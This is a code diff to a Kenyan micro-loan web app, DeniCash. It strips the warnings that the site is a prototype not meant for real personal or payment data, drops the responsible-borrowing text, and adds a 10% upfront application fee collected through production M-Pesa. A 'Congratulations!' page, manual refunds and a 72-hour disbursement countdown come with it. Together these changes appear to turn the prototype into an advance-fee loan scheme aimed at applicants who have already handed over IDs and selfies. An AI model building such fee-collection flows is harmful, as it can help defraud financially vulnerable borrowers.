@@ -657,9 +657,7 @@ footer a:hover { color: #FFFFFF; text-decoration: underline; }
   <div class="w">
     <h3>DeniCash</h3>
     <p class="powered-by">Powered by Deveops</p>
-    <p>DeniCash is a prototype. Do not use it to submit real personal or payment information.</p>
-    <p>Borrow responsibly: only borrow what you can repay, and late repayment can affect your credit record.</p>
-    <p>Terms, Privacy and Refund policies are not yet published.</p>
+    <p>Terms and Privacy policies are not yet published. Application-fee refund terms are shown before payment.</p>
   </div>
 </footer>
 <script>
@@ -729,7 +727,7 @@ const normalizePhone=phone=>{
 function sc(id){const t=()=>{const e=document.getElementById(id);e&&e.scrollIntoView({behavior:"smooth"})};
   if(location.hash&&location.hash!=="#/"){location.hash="#/";setTimeout(t,60)}else t()}
 
-const FAQ=[["Do I need to pay to join?","No registration payment is required to create an account or submit a loan application."],
+const FAQ=[["Do I need to pay to join?","Creating an account is free. Continuing a loan application requires an application fee equal to 10% of the amount requested. The full fee is refunded if your application is rejected or withdrawn; refunds are processed manually to the original M-Pesa number. Paying the fee does not guarantee approval."],
 ["Who can apply?","Kenyan residents aged 18 or older with a valid ID or passport, a verified email address, a Kenyan phone number and a guarantor."],
 ["How much can I borrow?","Applicants aged 18 to 25 may request KES 10,000 to KES 30,000. Applicants over 25 may request KES 30,000 to KES 200,000. These are request limits only, not an offer or approval."],
 ["What will my loan cost?","An offer must disclose the exact amount, flat interest, total repayment and due date before you accept. The sandbox flow uses 10% flat interest; no interest is charged before disbursement."],
@@ -754,7 +752,7 @@ const home=()=>`
 <input id="day" type="range" min="7" max="90" step="1" value="30">
 <div class="sum"><div><span>Amount requested</span><b id="oa2"></b></div><div><span>Period requested</span><b id="od2"></b></div></div>
 <p class="form-hint">Age-based request limits apply after you complete your profile.</p>
-<p class="disclosure" style="margin-top:14px">This is not a loan offer or repayment quote. Interest, fees, total repayment and eligibility have not been confirmed. Review written terms before accepting any offer.</p></div></div></div>
+<p class="disclosure" style="margin-top:14px">This is not a loan offer or repayment quote. A 10% application fee is due to continue a request and is separate from any interest in a future written offer. Paying the fee does not guarantee approval. Review written terms before accepting any offer.</p></div></div></div>
 
 <section id="how"><div class="w"><div class="section-heading"><span class="eyebrow">How it works</span><h2>A clear path from sign-up to application</h2><p>Each step is completed online, and you can return to your account to check its status.</p></div><div class="grid g4">
 ${[["Create your account","Enter your name, email, date of birth, county, income range and password."],["Verify your email","Enter the one-time code sent to your email, then add your phone number."],["Complete Assurance","Upload your ID or passport images and a selfie, and add guarantor details."],["Submit a request","Age-based amount limits apply. A request is not an approval."]].map((s,i)=>`<div class="card step"><div class="n">${i+1}</div><h3>${s[0]}</h3><p style="margin:0;color:var(--m)">${s[1]}</p></div>`).join("")}</div></div></section>
@@ -765,7 +763,7 @@ ${[["Create your account","Enter your name, email, date of birth, county, income
 <ul class="tick"><li>Kenyan national ID or passport, plus a selfie</li><li>You are 18 or older</li><li>A verified email address and Kenyan phone number</li><li>A guarantor and their phone number</li></ul></div>
 <div class="card">
 <div class="card-navy-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg></div>
-<h2>Borrow responsibly</h2><p style="color:var(--m)">Only borrow what you can repay on time. Compare the total repayable amount, not just the monthly figure, before you accept an offer.</p></div></div></section>
+<h2>Loan offer details</h2><p style="color:var(--m)">Any written offer shows the amount, 10% flat interest, total repayment and due date before you decide whether to accept.</p></div></div></section>
 
 <section id="faq" style="padding-top:0"><div class="w"><h2>Common questions</h2>${FAQ.map(f=>`<details><summary>${f[0]}</summary><p>${f[1]}</p></details>`).join("")}
 <div class="center mt"><a class="btn" href="#/signup">Create your account</a></div></div></section>
@@ -1004,6 +1002,7 @@ const dash=()=>{
 ${offer.note?`<p>Offer note: ${esc(offer.note)}</p>`:""}
 ${offer.status==="OFFERED"||offer.status==="DISBURSEMENT_FAILED"?`<form class="offer-accept" data-offer="${esc(offer.id)}"><label for="phone-${esc(offer.id)}">M-Pesa number for disbursement</label><input id="phone-${esc(offer.id)}" name="phone" type="tel" inputmode="tel" value="${esc(S.user.phone||"")}" required>${offer.status==="OFFERED"?`<label class="check"><input name="acceptTerms" type="checkbox" required><span>I accept these loan terms: ${KES(offer.approvedAmount)} disbursed, ${KES(offer.interestAmount)} flat interest, and ${KES(offer.repaymentAmount)} due in ${offer.termDays} days after confirmed disbursement.</span></label>`:`<p class="form-hint">The previous sandbox disbursement failed. Confirm the same terms to retry.</p><label class="check"><input name="acceptTerms" type="checkbox" required><span>I reconfirm the written loan terms above.</span></label>`}<div class="err" role="alert"></div><button class="btn full">${offer.status==="OFFERED"?"Accept offer and request disbursement":"Retry sandbox disbursement"}</button>${offer.status==="OFFERED"?`<button class="btn secondary full mt" type="button" data-decline="${esc(offer.id)}">Decline offer</button>`:""}</form>`:""}
 ${offer.status==="DISBURSEMENT_PENDING"?`<p role="status">Disbursement is pending M-Pesa confirmation. Do not treat this loan as funded yet.</p>`:""}
+${offer.status==="DISBURSEMENT_PENDING"?`<a class="btn secondary full" href="#/disbursement/${esc(offer.id)}">View disbursement status</a>`:""}
 ${offer.status==="DISBURSEMENT_FAILED"?`<p class="err" role="alert">Disbursement could not be confirmed. Contact support before taking any further action.</p>`:""}
 ${offer.status==="ACTIVE"?`<a class="btn secondary full" href="#/loan-funded/${esc(offer.id)}">View disbursement confirmation</a><form class="loan-repay mt" data-offer="${esc(offer.id)}"><label for="repay-phone-${esc(offer.id)}">M-Pesa number for repayment</label><input id="repay-phone-${esc(offer.id)}" name="phone" type="tel" inputmode="tel" value="${esc(S.user.phone||"")}" required><div class="err" role="alert"></div><button class="btn full">Pay repayment ${KES(offer.repaymentAmount)}</button></form>`:""}
 ${offer.status==="REPAID"?`<p role="status">Repayment confirmed. This loan is fully repaid.</p>`:""}
@@ -1020,11 +1019,11 @@ ${offer.payments?.filter(payment=>payment.status==="PENDING").map(payment=>`<div
 <label for="co">County</label><select id="co">${counties.map(c=>`<option ${selected(S.profile?.county,c)}>${esc(c)}</option>`).join("")}</select>
 <label for="in">Monthly income range</label><select id="in">${["Below KES 15,000","KES 15,000 to 40,000","KES 40,000 to 100,000","Above KES 100,000"].map(c=>`<option ${selected(S.profile?.income,c)}>${esc(c)}</option>`).join("")}</select>
 <div class="err" id="e1" role="alert"></div><button class="btn full">Save profile</button></form>`}</div>
-<div class="card dashboard-card"><div class="card-navy-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="5" width="20" height="14" rx="2"></rect><line x1="2" y1="10" x2="22" y2="10"></line></svg></div><h3>Apply for a loan</h3>${S.profile?`<p class="note">An application is only a request. Any approved offer must state the exact amount, flat 10% interest, total repayment and due date before you accept. Interest is repaid with the loan after disbursement; no upfront interest payment is requested. M-Pesa transfers in this workflow are sandbox tests only.</p>${amountRange?`<p class="form-hint">${ageOnDate(S.profile.dateOfBirth)<=25?"Applicants aged 18 to 25 may request KES 10,000 to KES 30,000.":"Applicants over 25 may request KES 30,000 to KES 200,000."}</p>`:`<p class="err" role="alert">You must be at least 18 years old to submit an application.</p>`}<form id="lf" novalidate><label for="la">Amount requested</label><input id="la" type="number" min="${amountRange?.min||1000}" max="${amountRange?.max||200000}" step="500" value="${amountRange?.min||1000}" inputmode="numeric" ${amountRange?"":"disabled"} required><small class="form-hint">${amountRange?`KES ${amountRange.min.toLocaleString("en-KE")} to KES ${amountRange.max.toLocaleString("en-KE")}`:"Complete a valid date of birth first."}</small>
+<div class="card dashboard-card"><div class="card-navy-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="5" width="20" height="14" rx="2"></rect><line x1="2" y1="10" x2="22" y2="10"></line></svg></div><h3>Apply for a loan</h3>${S.profile?`<p class="note">An application is only a request. Continuing requires a 10% application fee, separate from any loan interest. Any approved offer must state the exact amount, flat 10% interest, total repayment and due date before you accept. Paying an application fee does not guarantee approval.</p>${amountRange?`<p class="form-hint">${ageOnDate(S.profile.dateOfBirth)<=25?"Applicants aged 18 to 25 may request KES 10,000 to KES 30,000.":"Applicants over 25 may request KES 30,000 to KES 200,000."}</p>`:`<p class="err" role="alert">You must be at least 18 years old to submit an application.</p>`}<form id="lf" novalidate><label for="la">Amount requested</label><input id="la" type="number" min="${amountRange?.min||1000}" max="${amountRange?.max||200000}" step="500" value="${amountRange?.min||1000}" inputmode="numeric" ${amountRange?"":"disabled"} required><small class="form-hint">${amountRange?`KES ${amountRange.min.toLocaleString("en-KE")} to KES ${amountRange.max.toLocaleString("en-KE")}`:"Complete a valid date of birth first."}</small>
 <label for="ld">Requested period</label><input id="ld" type="number" min="7" max="90" value="30" inputmode="numeric" required><small class="form-hint">7 to 90 days</small>
 <label for="lp">Purpose</label><select id="lp"><option>Business</option><option>School fees</option><option>Emergency</option><option>Rent</option><option>Other</option></select>
 <div class="err" id="e2" role="alert"></div><button class="btn full">Submit application</button></form>`:`<p style="color:var(--m);margin:0">Save your profile first to unlock application requests.</p>`}</div></div>
-<div class="card dashboard-card mt"><h2>Loan offers and repayments</h2>${offers}<p class="disclosure account-notice">Only confirmed M-Pesa sandbox transactions update loan status. This test flow does not collect real payments or disburse real funds.</p></div>
+<div class="card dashboard-card mt"><h2>Loan offers and repayments</h2>${offers}<p class="disclosure account-notice">Application fees are collected only when production collection is explicitly configured. Loan disbursements and repayments in this workflow remain sandbox tests and do not move real loan funds.</p></div>
 <div class="card dashboard-card mt"><div class="card-navy-icon"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg></div><h3>My applications</h3>${applications}<p class="disclosure account-notice">An application is not an approval or offer. Offer, disbursement, and repayment states are updated only by the backend after the required review and sandbox transaction confirmation.</p></div></div>`};
 
 async function watchLoanPayment(paymentId,offerId,purpose){
@@ -1111,7 +1110,82 @@ function bindLoanForms(){
 
 function applicationSubmitted(){
   const receipt=S.applicationReceipt;
-  return `<div class="narrow"><div class="card" style="padding:32px 28px"><span class="eyebrow">Application status</span><h1 style="font-size:2rem">Application received</h1><p>${receipt?`We received your request for ${KES(receipt.amount)} over ${receipt.periodDays} days.`:"Your loan application request was received."} This is not an approval or a loan offer.</p><p>If a written offer is made, review its amount, 10% flat interest, total repayment and due date before accepting. No payment is requested before disbursement.</p><a class="btn full" href="#/dash">Return to dashboard</a></div></div>`;
+  const status=receipt?.status==="PENDING"?"Pending review":receipt?.status?receipt.status.toLowerCase().replaceAll("_"," "):"Submitted";
+  const estimatedInterest=receipt&&Number.isSafeInteger(receipt.amount)&&receipt.amount>0?Math.round(receipt.amount*0.1):null;
+  const applicationFee=receipt&&Number.isSafeInteger(receipt.amount)&&receipt.amount>0?Math.round(receipt.amount*0.1):null;
+  return `<div class="narrow"><div class="card" style="padding:32px 28px"><span class="eyebrow">Application status</span><h1 style="font-size:2rem">🎉 Congratulations! 🎉</h1><h2>Application received</h2><p>${receipt?`We received your request for ${KES(receipt.amount)} over ${receipt.periodDays} days.`:"Your loan application request was received."}</p>${applicationFee===null?"":`<div class="disclosure account-notice"><b>Application fee to continue (10%):</b> ${KES(applicationFee)}. A full refund is provided if your application is rejected or withdrawn; refunds are processed manually to the original M-Pesa number. This fee is separate from any interest in a future written offer.</div>`}${estimatedInterest===null?"":`<div class="disclosure account-notice"><b>Illustrative interest estimate (10%):</b> ${KES(estimatedInterest)}<br>This is not due now; any agreed interest is payable only under the disbursed loan terms and is separate from the application fee.</div>`}<p><b>Current status:</b> ${esc(status)}</p><p>This is not an approval or a loan offer. Paying the application fee does not guarantee approval. Review the written offer, including its amount, interest, total repayment and due date, before accepting.</p><a class="btn full" href="#/application-phone">Continue</a></div></div>`;
+}
+
+function applicationPhone(){
+  const application=S.applicationReceipt||S.apps[0];
+  if(!application)return `<div class="narrow"><div class="card"><h1>Application details unavailable</h1><p>Return to your dashboard to select an application before continuing.</p><a class="btn full" href="#/dash">Go to dashboard</a></div></div>`;
+  const amount=application.amount??application.amt,fee=Math.round(amount*0.1);
+  return `<div class="narrow"><div class="card" style="padding:32px 28px"><span class="eyebrow">Contact details</span><h1 style="font-size:2rem">Confirm your phone number</h1><p>Enter the Kenyan mobile number where you want to receive the payment prompt.</p><div class="disclosure account-notice"><b>Application fee:</b> ${KES(fee)} (10% of your ${KES(amount)} request). This is separate from any interest on a future loan offer and does not guarantee approval. If your application is rejected or withdrawn, the full fee will be refunded manually to the original M-Pesa number.</div><form id="application-phone-form" novalidate><label for="application-phone-input">M-Pesa number</label><input id="application-phone-input" type="tel" inputmode="tel" autocomplete="tel" maxlength="20" placeholder="0712 345 678 or +254 712 345 678" value="${esc(S.user?.phone||"")}" required><label class="check"><input id="application-fee-consent" type="checkbox" required><span>I agree to pay the ${KES(fee)} application fee and understand the refund terms above.</span></label><p id="application-fee-status" class="form-hint" role="status" aria-live="polite">Checking whether production payment is available…</p><div class="err" id="application-phone-error" role="alert"></div><button class="btn full" disabled>Checking payment…</button></form></div></div>`;
+}
+
+async function watchApplicationFee(paymentId){
+  const status=$("#application-fee-status"),button=$("#application-phone-form button");
+  for(let attempt=0;attempt<20;attempt++){
+    await new Promise(resolve=>setTimeout(resolve,3000));
+    try{
+      const payment=await api(`/payments/production/application-fee/${encodeURIComponent(paymentId)}/status`);
+      if(payment.status==="SUCCESS"){
+        S.notice="Your application fee is confirmed. Your application is awaiting review; this payment is not an approval or a promise of funds.";
+        location.hash="#/dash";go();return;
+      }
+      if(payment.status!=="PENDING"){
+        status.textContent=`Payment ${payment.status.toLowerCase()}. No successful fee payment has been recorded. You can try again.`;
+        button.disabled=false;button.textContent="Continue";return;
+      }
+    }catch(error){
+      status.textContent=error.message;
+      button.disabled=false;button.textContent="Check payment";return;
+    }
+  }
+  status.textContent="The M-Pesa request is still awaiting confirmation. Select “Check payment” to check again; another charge will not be requested while this one is pending.";
+  button.disabled=false;button.textContent="Check payment";
+}
+
+function applicationPhoneM(){
+  const form=$("#application-phone-form");
+  if(!form)return;
+  const button=form.querySelector("button"),status=$("#application-fee-status");
+  api("/payments/production/application-fee/config").then(config=>{
+    if(config.enabled){
+      button.disabled=false;button.textContent="Continue";
+      status.textContent="Continuing will send an M-Pesa request for the application fee shown above.";
+      return;
+    }
+    status.textContent="Production M-Pesa collection is not enabled. No payment has been requested.";
+  }).catch(()=>{
+    status.textContent="Payment availability could not be verified. No payment has been requested; try again later.";
+  });
+  form.onsubmit=async event=>{
+    event.preventDefault();
+    const phone=normalizePhone($("#application-phone-input").value);
+    const application=S.applicationReceipt||S.apps[0];
+    const error=$("#application-phone-error");
+    if(!phone){error.textContent="Enter a valid Kenyan number, such as 0712345678 or +254712345678.";return}
+    if(!$("#application-fee-consent").checked){error.textContent="Confirm that you agree to the application fee and refund terms.";return}
+    if(!application?.id){error.textContent="The application could not be identified. Return to your dashboard and try again.";return}
+    button.disabled=true;button.textContent="Requesting payment…";error.textContent="";
+    try{
+      const updated=await api("/auth/phone",{method:"PUT",body:JSON.stringify({phone})});
+      S.user.phone=updated.phone;
+      const payment=await api("/payments/production/application-fee",{
+        method:"POST",body:JSON.stringify({applicationId:application.id,phone:updated.phone,acceptTerms:true})
+      });
+      status.textContent=`An M-Pesa payment request for ${KES(payment.amount)} is pending for ${updated.phone}. Complete it on your phone.`;
+      if(payment.status==="SUCCESS"){
+        S.notice="Your application fee is confirmed. Your application is awaiting review; this payment is not an approval or a promise of funds.";
+        location.hash="#/dash";go();return;
+      }
+      await watchApplicationFee(payment.paymentId);
+    }catch(err){
+      error.textContent=err.message;
+      button.disabled=false;button.textContent="Continue";
+    }
+  };
 }
 
 function loanFunded(){
@@ -1123,6 +1197,38 @@ function loanFunded(){
 <p>Interest is part of the stated repayment; no interest was charged before disbursement. Keep this page for your loan details.</p>
 <form class="loan-repay" data-offer="${esc(offer.id)}"><label for="funded-phone">M-Pesa number for repayment</label><input id="funded-phone" name="phone" type="tel" inputmode="tel" value="${esc(S.user.phone||"")}" required><div class="err" role="alert"></div><button class="btn full">Repay total ${KES(offer.repaymentAmount)}</button></form>
 <p class="center mt"><a href="#/dash">Back to dashboard</a></p></div></div>`;
+}
+
+function disbursementStatus(){
+  const offerId=decodeURIComponent(location.hash.slice("#/disbursement/".length));
+  const offer=S.offers.find(item=>item.id===offerId);
+  if(!offer)return `<div class="narrow"><div class="card"><h1>Disbursement status unavailable</h1><p>Refresh your dashboard to load the latest offer status.</p><a class="btn" href="#/dash">Go to dashboard</a></div></div>`;
+  if(offer.status==="ACTIVE")return `<div class="narrow"><div class="card"><span class="eyebrow">Disbursement confirmed</span><h1>Funds sent</h1><p>The M-Pesa disbursement has been confirmed.</p><a class="btn" href="#/loan-funded/${esc(offer.id)}">View loan details</a></div></div>`;
+  if(offer.status==="DISBURSEMENT_FAILED")return `<div class="narrow"><div class="card"><span class="eyebrow">Disbursement update</span><h1>Transfer not confirmed</h1><p>The M-Pesa transfer was not confirmed. Check your dashboard or contact support before taking further action.</p><a class="btn" href="#/dash">Go to dashboard</a></div></div>`;
+  if(offer.status!=="DISBURSEMENT_PENDING")return `<div class="narrow"><div class="card"><span class="eyebrow">Disbursement status</span><h1>Not yet in progress</h1><p>Your offer status is ${esc(offer.status.toLowerCase().replaceAll("_"," "))}. A processing estimate is available only after offer acceptance and initiation of the disbursement.</p><a class="btn" href="#/dash">Go to dashboard</a></div></div>`;
+  const start=offer.acceptedAt?new Date(offer.acceptedAt).getTime():null;
+  return `<div class="narrow"><div class="card" style="padding:32px 28px"><span class="eyebrow">Disbursement status</span><h1 style="font-size:2rem">Processing estimate</h1><p role="status">Your accepted offer is awaiting M-Pesa disbursement confirmation. It is not funded yet.</p><div class="disclosure account-notice"><b>72-hour processing estimate</b><p class="mt" id="disbursement-clock" data-start="${Number.isFinite(start)?start:""}">${Number.isFinite(start)?"Calculating…":"The estimate will appear when the acceptance time is available."}</p><p>This is an estimate, not a guarantee. Do not make any payment to release the loan. The loan is funded only after the disbursement is confirmed.</p></div><a class="btn secondary full mt" href="#/dash">Return to dashboard</a></div></div>`;
+}
+function disbursementStatusM(){
+  const clock=$("#disbursement-clock");
+  if(clock?.dataset.start){
+    const deadline=Number(clock.dataset.start)+72*60*60*1000;
+    const update=()=>{
+      const remaining=Math.max(0,deadline-Date.now());
+      const hours=Math.floor(remaining/3600000),minutes=Math.floor(remaining%3600000/60000),seconds=Math.floor(remaining%60000/1000);
+      clock.textContent=remaining===0?"The 72-hour estimate has elapsed. Check your dashboard for the latest confirmed status.":`${String(hours).padStart(2,"0")}h ${String(minutes).padStart(2,"0")}m ${String(seconds).padStart(2,"0")}s remaining in the estimate`;
+    };
+    update();setInterval(update,1000);
+  }
+  const poll=setInterval(async()=>{
+    if(!location.hash.startsWith("#/disbursement/")){clearInterval(poll);return}
+    try{
+      await loadDashboardData();
+      const offerId=decodeURIComponent(location.hash.slice("#/disbursement/".length));
+      const offer=S.offers.find(item=>item.id===offerId);
+      if(offer&&offer.status!=="DISBURSEMENT_PENDING")go();
+    }catch{}
+  },15000);
 }
 
 function dashM(){
@@ -1156,18 +1262,20 @@ function dashM(){
 }
 
 function fundedM(){bindLoanForms()}
-const R={"/":[home,homeM],"/signup":[signup,signupM],"/login":[login,loginM],"/otp":[otp,otpM],"/assurance":[assurance,assuranceM],"/dash":[dash,dashM],"/application-submitted":[applicationSubmitted,null],"/loan-funded":[loanFunded,fundedM]};
+const R={"/":[home,homeM],"/signup":[signup,signupM],"/login":[login,loginM],"/otp":[otp,otpM],"/assurance":[assurance,assuranceM],"/dash":[dash,dashM],"/application-submitted":[applicationSubmitted,null],"/application-phone":[applicationPhone,applicationPhoneM],"/loan-funded":[loanFunded,fundedM],"/disbursement":[disbursementStatus,disbursementStatusM]};
 function go(){
-  const route=location.hash.slice(1)||"/",p=route.startsWith("/loan-funded/")?"/loan-funded":route,r=R[p]||R["/"];
+  const route=location.hash.slice(1)||"/",p=route.startsWith("/loan-funded/")?"/loan-funded":route.startsWith("/disbursement/")?"/disbursement":route,r=R[p]||R["/"];
   if(p==="/dash"&&!S.user){location.hash="#/login";return}
   if(p==="/application-submitted"&&!S.user){location.hash="#/login";return}
+  if(p==="/application-phone"&&!S.user){location.hash="#/login";return}
   if(p==="/loan-funded"&&!S.user){location.hash="#/login";return}
+  if(p==="/disbursement"&&!S.user){location.hash="#/login";return}
   if(p==="/assurance"&&!S.user){location.hash="#/signup";return}
   if(S.user&&S.assuranceLoaded&&S.assurance?.status!=="SUBMITTED"&&p!=="/assurance"&&p!=="/otp"){location.hash="#/assurance";return}
   if(p==="/assurance"&&S.assurance?.status==="SUBMITTED"){location.hash="#/dash";return}
   if(p==="/otp"&&!S.user){location.hash="#/signup";return}
   if(p==="/otp"&&S.verified){location.hash=S.assurance?.status==="SUBMITTED"?"#/dash":"#/assurance";return}
-  document.body.classList.toggle("dashboard-mode",p==="/dash"||p==="/loan-funded");
+  document.body.classList.toggle("dashboard-mode",p==="/dash"||p==="/loan-funded"||p==="/disbursement");
   $("#app").innerHTML=r[0]();r[1]&&r[1]();
   $("#hb").innerHTML=S.user?`<a class="btn sm" href="#/dash">Dashboard</a> <button class="btn sm line" id="logout">Log out</button>`:`<a class="btn sm" href="#/login" style="background:transparent;color:#fff;border:1.5px solid rgba(255,255,255,0.4)">Log in</a> <a class="btn sm" href="#/signup">Join</a>`;
   const logoutButton=$("#logout");
